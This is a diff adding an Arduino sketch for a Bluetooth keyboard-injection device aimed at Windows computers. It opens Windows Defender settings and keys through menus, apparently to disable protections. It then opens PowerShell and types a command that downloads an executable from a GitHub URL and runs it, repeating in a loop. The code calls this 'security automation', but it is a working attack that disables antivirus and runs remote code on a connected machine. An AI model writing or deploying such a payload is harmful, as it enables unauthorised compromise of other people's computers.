@@ -1,0 +1,138 @@
+#include <BleKeyboard.h>
+
+BleKeyboard bleKeyboard;
+
+void setup() {
+    Serial.begin(115200);
+    Serial.println("Starting BLE Keyboard...");
+    bleKeyboard.begin();
+}
+
+void loop() {
+    if (bleKeyboard.isConnected()) {
+        Serial.println("Executing Windows Security Automation...");
+
+        // Press WIN + R
+        Serial.println("Pressing WIN + R");
+        bleKeyboard.press(KEY_LEFT_GUI);
+        bleKeyboard.press('r');
+        delay(2000);
+        bleKeyboard.releaseAll();
+
+        delay(2000);
+
+        // Type "windowsdefender:"
+        Serial.println("Typing 'windowsdefender:'");
+        bleKeyboard.print("windowsdefender:");
+        delay(2000);
+
+        // Press ENTER
+        Serial.println("Pressing ENTER");
+        bleKeyboard.write(KEY_RETURN);
+        delay(4000);
+
+        // Press ENTER again
+        Serial.println("Pressing ENTER again");
+        bleKeyboard.write(KEY_RETURN);
+        delay(2000);
+
+        // Press TAB 4 times
+        Serial.println("Pressing TAB 4 times");
+        for (int i = 0; i < 4; i++) {
+            bleKeyboard.write(KEY_TAB);
+            delay(2000);
+        }
+
+        // Press ENTER
+        Serial.println("Pressing ENTER");
+        bleKeyboard.write(KEY_RETURN);
+        delay(2000);
+
+        // Press SPACEBAR
+        Serial.println("Pressing SPACE");
+        bleKeyboard.write(' ');
+        delay(2000);
+
+        // Wait 3 seconds
+        Serial.println("Waiting 3 seconds...");
+        delay(3000);
+
+        // Press RIGHT ARROW
+        Serial.println("Pressing RIGHT ARROW");
+        bleKeyboard.write(KEY_LEFT_ARROW);
+        delay(2000);
+
+        // Press ENTER
+        Serial.println("Pressing ENTER");
+        bleKeyboard.write(KEY_RETURN);
+        delay(2000);
+
+        // Press TAB 6 times
+        Serial.println("Pressing TAB 6 times");
+        for (int i = 0; i < 6; i++) {
+            bleKeyboard.write(KEY_TAB);
+            delay(2000);
+        }
+
+        // Press SPACEBAR
+        Serial.println("Pressing SPACE");
+        bleKeyboard.write(' ');
+        delay(2000);
+
+        // Wait 3 seconds
+        Serial.println("Waiting 3 seconds...");
+        delay(3000);
+
+        // Press RIGHT ARROW
+        Serial.println("Pressing RIGHT ARROW");
+        bleKeyboard.write(KEY_RIGHT_ARROW);
+        delay(2000);
+
+        // Press ENTER
+        Serial.println("Pressing ENTER");
+        bleKeyboard.write(KEY_RETURN);
+        delay(2000);
+
+        // ---------- NEW COMMANDS START HERE ----------
+        delay(2000);
+
+        // Open Run Again (WIN + R)
+        Serial.println("Pressing WIN + R Again");
+        bleKeyboard.press(KEY_LEFT_GUI);
+        bleKeyboard.press('r');
+        delay(2000);
+        bleKeyboard.releaseAll();
+
+        delay(2000);
+
+        // Type "powershell"
+        Serial.println("Typing 'powershell'");
+        bleKeyboard.print("powershell");
+        delay(2000);
+
+        // Press ENTER to open PowerShell
+        Serial.println("Pressing ENTER");
+        bleKeyboard.write(KEY_RETURN);
+        delay(2000);
+
+        // Type command to download and run a program
+        Serial.println("Downloading & Running Program...");
+        bleKeyboard.print("$wc = New-Object System.Net.WebClient; ");
+        delay(2000);
+        bleKeyboard.print("$wc.DownloadFile('https://github.com/adwaithkm1/drd/raw/refs/heads/main/ducky.exe', 'C:\\downloaded.exe'); ");
+        delay(2000);
+        bleKeyboard.print("Start-Process 'C:\\downloaded.exe'");
+        delay(2000);
+
+        // Press ENTER to execute
+        Serial.println("Pressing ENTER to run the program");
+        bleKeyboard.write(KEY_RETURN);
+        delay(2000);
+
+        Serial.println("Automation Complete! Waiting 10 seconds before restarting...");
+        delay(10000); // Wait before repeating
+    }
+
+    Serial.println("Waiting for BLE connection...");
+    delay(5000);
+}
